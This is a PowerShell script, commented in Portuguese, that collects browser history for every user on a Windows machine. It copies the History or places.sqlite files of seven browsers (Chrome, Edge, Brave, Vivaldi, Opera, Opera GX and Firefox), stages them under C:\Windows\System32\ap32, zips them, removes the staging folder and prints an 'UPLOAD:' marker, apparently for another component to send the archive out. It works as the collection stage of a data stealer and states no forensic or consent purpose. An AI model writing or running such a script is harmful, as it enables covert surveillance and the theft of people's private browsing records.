# Copiar histórico dos principais browsers -  Chrome, Edge, Brave, Vivaldi, Opera, Opera GX e Firefox

$DestinoBase = "C:\Windows\System32\ap32\Browser_History"
$Timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
$Destino = Join-Path $DestinoBase $Timestamp
$DestinoZip = "C:\Windows\System32\ap32\Browser_History_$Timestamp.zip"

New-Item -ItemType Directory -Path $Destino -Force | Out-Null

$Perfis = Get-ChildItem "C:\Users" -Directory -ErrorAction SilentlyContinue |
    Where-Object {
        $_.Name -notin @(
            "Public",
            "Default",
            "Default User",
            "All Users"
        )
    }

foreach ($Perfil in $Perfis) {

    $UserName = $Perfil.Name
    $UserPath = $Perfil.FullName

    Write-Host "A processar: $UserName"

    $LocalAppData = Join-Path $UserPath "AppData\Local"
    $RoamingAppData = Join-Path $UserPath "AppData\Roaming"

    # Chrome
    $Chrome = Join-Path $LocalAppData "Google\Chrome\User Data"

    # Edge
    $Edge = Join-Path $LocalAppData "Microsoft\Edge\User Data"

    # Brave
    $Brave = Join-Path $LocalAppData "BraveSoftware\Brave-Browser\User Data"

    # Vivaldi
    $Vivaldi = Join-Path $LocalAppData "Vivaldi\User Data"

    $ChromiumBrowsers = @{
        "Chrome"   = $Chrome
        "Edge"     = $Edge
        "Brave"    = $Brave
        "Vivaldi"  = $Vivaldi
    }

    foreach ($Browser in $ChromiumBrowsers.GetEnumerator()) {

        if (-not (Test-Path $Browser.Value)) {
            continue
        }

        $Profiles = Get-ChildItem $Browser.Value -Directory -ErrorAction SilentlyContinue |
            Where-Object {
                $_.Name -eq "Default" -or
                $_.Name -match "^Profile \d+$"
            }

        foreach ($BrowserProfile in $Profiles) {

            $Src = Join-Path $BrowserProfile.FullName "History"

            if (Test-Path $Src) {

                $Dst = Join-Path $Destino "$UserName\$($Browser.Key)\$($BrowserProfile.Name)"

                New-Item -ItemType Directory -Path $Dst -Force | Out-Null

                try {
                    Copy-Item $Src -Destination $Dst -Force -ErrorAction Stop
                    Write-Host "[OK] $UserName - $($Browser.Key) - $($BrowserProfile.Name)"
                }
                catch {
                    Write-Warning "[ERRO] $Src : $($_.Exception.Message)"
                }
            }
        }
    }

    # Opera
    $OperaPaths = @{
        "Opera" = Join-Path $RoamingAppData "Opera Software\Opera Stable"
        "Opera GX" = Join-Path $RoamingAppData "Opera Software\Opera GX Stable"
    }

    foreach ($Opera in $OperaPaths.GetEnumerator()) {

        $Src = Join-Path $Opera.Value "History"

        if (Test-Path $Src) {

            $Dst = Join-Path $Destino "$UserName\$($Opera.Key)"

            New-Item -ItemType Directory -Path $Dst -Force | Out-Null

            try {
                Copy-Item $Src -Destination $Dst -Force -ErrorAction Stop
                Write-Host "[OK] $UserName - $($Opera.Key)"
            }
            catch {
                Write-Warning "[ERRO] $Src : $($_.Exception.Message)"
            }
        }
    }

    # Firefox
    $FirefoxProfiles = Join-Path $RoamingAppData "Mozilla\Firefox\Profiles"

    if (Test-Path $FirefoxProfiles) {

        Get-ChildItem $FirefoxProfiles -Directory -ErrorAction SilentlyContinue |
            ForEach-Object {

                $Src = Join-Path $_.FullName "places.sqlite"

                if (Test-Path $Src) {

                    $Dst = Join-Path $Destino "$UserName\Firefox\$($_.Name)"

                    New-Item -ItemType Directory -Path $Dst -Force | Out-Null

                    try {
                        Copy-Item $Src -Destination $Dst -Force -ErrorAction Stop
                        Write-Host "[OK] $UserName - Firefox - $($_.Name)"
                    }
                    catch {
                        Write-Warning "[ERRO] $Src : $($_.Exception.Message)"
                    }
                }
            }
    }
}


Compress-Archive -Path $Destino -DestinationPath $DestinoZip -Force

Remove-Item $Destino -Recurse -Force -ErrorAction SilentlyContinue

Write-Output "UPLOAD:$DestinoZip"